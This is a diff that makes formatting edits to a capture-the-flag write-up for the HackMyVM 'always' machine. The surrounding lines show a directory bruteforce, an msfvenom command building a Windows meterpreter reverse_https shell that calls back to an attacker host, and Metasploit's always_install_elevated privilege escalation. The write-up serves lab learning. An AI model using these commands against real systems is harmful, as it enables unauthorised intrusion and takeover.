@@ -74,7 +74,7 @@ Looking at port 80, not much going on here:
 
 ![[Pasted image 20241031120721.png]]
 
-Doing a directory bruteforce, we see a hidden directory called Admin:
+Doing a directory bruteforce, we see a hidden directory called `Admin`:
 
 ```bash
 garffff@garffff:~/hackmyvm/always$ feroxbuster -u http://192.168.0.72:8080/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html
@@ -180,9 +180,9 @@ garffff@garffff:~/hackmyvm/always$ echo -n 'WW91Q2FudEZpbmRNZS4hLiE=' | base64 -
 YouCantFindMe.!.!
 ```
 
-This password does not work on any service. Suspect it is a box issue
+This password does not work on any service. Suspect it is a box issue.
 
-Login into the VM directly as the ftpuser works. Do get a shell, I used the following msfvenom:
+Login into the VM directly as the `ftpuser` works. Do get a shell, I used the following `msfvenom`:
 
 ```bash
 garffff@garffff:~/hackmyvm/always$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.51 LPORT=443 -f exe > shell.exe
@@ -286,7 +286,7 @@ msf6 post(multi/recon/local_exploit_suggester) > run
 
 ```
 
-Using the always_install_elevated exploit:
+Using the `always_install_elevated` exploit:
 
 ```bash
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/always_install_elevated
